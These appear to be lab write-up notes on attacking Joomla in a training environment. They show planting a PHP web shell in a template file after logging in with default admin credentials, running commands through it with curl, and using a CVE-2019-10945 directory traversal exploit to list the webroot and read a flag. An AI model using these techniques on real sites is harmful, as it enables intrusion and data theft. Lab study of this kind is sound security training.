# Attacking Joomla

## Abusing Built-In Functionality

Using the credentials that we obtained in the examples from the last section, admin:admin, let's log in to the target backend at :
http://dev.inlanefreight.local/administrator

Configuration > Templates > click on a template name

Bring us to Template customize page :
http://dev.inlanefreight.local/administrator/index.php?option=com_templates&view=template&id=506

> Click on a PHP page

system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);

curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

## Leveraging Known Vulnerabilities

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945

--> list the contents of the webroot and other directories

Exploitation script : https://github.com/dpgg101/CVE-2019-10945

python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
 

## LAB

IP=10.129.54.128
printf "%s\t%s\n\n" "$IP" "app.inlanefreight.local dev.inlanefreight.local blog.inlanefreight.local" | sudo tee -a /etc/hosts

git clone https://github.com/dpgg101/CVE-2019-10945
cd CVE-2019-10945/
python3 CVE-2019-10945.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /

 _    _          ____   ____   ____  ____  
| |  | |   /\   |  _ \ / __ \ / __ \|  _ \ 
| |__| |  /  \  | |_) | |  | | |  | | |_) |
|  __  | / /\ \ |  _ <| |  | | |  | |  _ < 
| |  | |/ ____ \| |_) | |__| | |__| | |_) |
|_|  |_/_/    \_\____/ \____/ \____/|____/ 
                                                                       


administrator
bin
cache
cli
components
images
includes
language
layouts
libraries
media
modules
plugins
templates
tmp
LICENSE.txt
README.txt
configuration.php
flag_6470e394cbf6dab6a91682cc8585059b.txt
htaccess.txt
index.php
robots.txt
web.config.txt


http://dev.inlanefreight.local/administrator

http://dev.inlanefreight.local/administrator/index.php?option=com_templates&view=template&id=506&file=L2Vycm9yLnBocA%3D%3D

system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);

curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=cat%20flag_6470e394cbf6dab6a91682cc8585059b.txt

curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=pwd

/var/www/dev.inlanefreight.local/templates/protostar

cat /var/www/dev.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt

curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=cat%20%2Fvar%2Fwww%2Fdev.inlanefreight.local%2Fflag_6470e394cbf6dab6a91682cc8585059b.txt
j00mla_c0re_d1rtrav3rsal!
